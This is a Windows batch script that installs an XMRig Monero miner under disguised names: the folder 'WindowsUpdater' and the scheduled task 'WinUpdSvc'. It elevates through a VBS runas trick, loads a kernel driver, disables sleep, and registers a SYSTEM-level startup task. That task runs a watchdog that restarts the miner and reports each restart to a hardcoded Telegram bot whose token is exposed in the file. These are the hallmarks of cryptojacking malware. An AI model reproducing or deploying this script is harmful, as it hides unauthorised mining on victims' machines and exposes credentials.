@echo off
REM Force the window to be visible
title Monero Miner Setup - High Mid-End PC
color 0A

REM ====================================================================
REM Ultimate Monero Miner - High Mid-End Edition
REM Optimized for 14-core CPUs with 16GB RAM (e.g., Intel i5-14400)
REM Installs to C:\ProgramData\WindowsUpdater as requested
REM Includes Telegram alert support
REM ====================================================================
setlocal enableextensions enabledelayedexpansion

REM === Debug Logging ===
echo [*] Script started at %date% %time% > "%temp%\miner_debug.log"
echo [*] Running as user: %username% >> "%temp%\miner_debug.log"

REM === CONFIGURATION ===
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=WinUpdSvc"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "POOL=gulf.moneroocean.stream:10128"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

REM === Telegram Bot (for alerts) ===
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

REM === One-Time Admin Enforcement ===
echo [*] Checking for admin privileges...
echo [*] Checking for admin privileges... >> "%temp%\miner_debug.log"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo [!] Admin privileges not detected. Attempting to elevate...
    echo [!] Admin privileges not detected. Attempting to elevate... >> "%temp%\miner_debug.log"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)
echo [✔] Running with admin privileges.
echo [✔] Running with admin privileges. >> "%temp%\miner_debug.log"

echo ===============================
echo Starting Monero Miner on High Mid-End PC
echo ===============================

echo [*] Initial setup complete. Press any key to continue...
pause

REM === Clean Up Existing Task and MSR Driver ===
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1

REM === MSR Driver Installation (With Fallback) ===
if exist "%SRC%\winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
    sc start WinRing0_1_2_0
)

REM === System Optimization ===
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /hibernate off
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCIDLE 0
powercfg /setactive SCHEME_CURRENT

REM === CPU Core Detection ===
set "AFFINITY_MASK="
for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do (
    set /a "CORES=%%A"
    set /a "AFFINITY_MASK=(1<<%%A)-1"
)
if not defined AFFINITY_MASK (
    set "AFFINITY_MASK=63"
)

REM === Auto-Update Miner ===
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"

if defined URL (
    powershell -Command "try {IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop}" 2>> "%temp%\miner_debug.log"
    if '%errorlevel%' equ '0' (
        if exist "%TEMP%\xmrig.zip" (
            if not exist "%SRC%" mkdir "%SRC%"
            powershell -Command "try {Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force}" 2>> "%temp%\miner_debug.log"
            del "%TEMP%\xmrig.zip"
        )
    )
)

REM === Install Files ===
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul

REM === Generate Watchdog Script with Telegram Support ===
(
  echo @echo off
  echo setlocal enabledelayedexpansion
  echo set "MUTEX_FILE=%%TEMP%%\xmrig_watchdog.lock"
  echo set "XMRIG_PATH=%DEST%\xmrig.exe"
  echo set "POOL=%POOL%"
  echo set "WALLET=%WALLET%"
  echo set "PASSWORD=%%COMPUTERNAME%%"
  echo set "ALGO=rx/0"
  echo set "TG_TOKEN=%TG_TOKEN%"
  echo set "TG_CHAT_ID=%TG_CHAT_ID%"
  echo if exist "%%MUTEX_FILE%%" (
  echo     echo [!] Watchdog already running. Exiting.
  echo     exit /b
  echo )
  echo echo locked ^> "%%MUTEX_FILE%%"
  echo :loop
  echo tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe" ^>nul
  echo if errorlevel 1 (
  echo     echo [*] XMRig not running. Launching miner...
  echo     start /min "" "%%XMRIG_PATH%%" -o %%POOL%% -u %%WALLET%% -p %%PASSWORD%% -a %%ALGO%% -k --donate-level=0 --randomx-1gb-pages --threads=auto --cpu-priority=3 --max-cpu-usage=90 --print-time=60
  echo     curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" -d "chat_id=!TG_CHAT_ID!" -d "text=[ALERT] XMRig was restarted on !COMPUTERNAME!"
  echo ) else (
  echo     echo [✔] XMRig is running. Checking again in 30 seconds...
  echo )
  echo timeout /t 30 ^>nul
  echo goto loop
) > "%DEST%\run_watchdog.bat"

REM === Permanent Auto-Start ===
schtasks /create /tn "%TASK_NAME%" ^
  /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
  /sc onstart ^
  /ru SYSTEM ^
  /rl HIGHEST ^
  /f

REM === Launch Watchdog Immediately ===
start "" /min "%DEST%\run_watchdog.bat"

echo [✔] Miner installed (optimized for high mid-end PC)
echo CPU Affinity: !AFFINITY_MASK!
echo Logs: %LOG_FILE%
echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
echo [✔] Miner installed at %date% %time% >> "%temp%\miner_debug.log"
pause
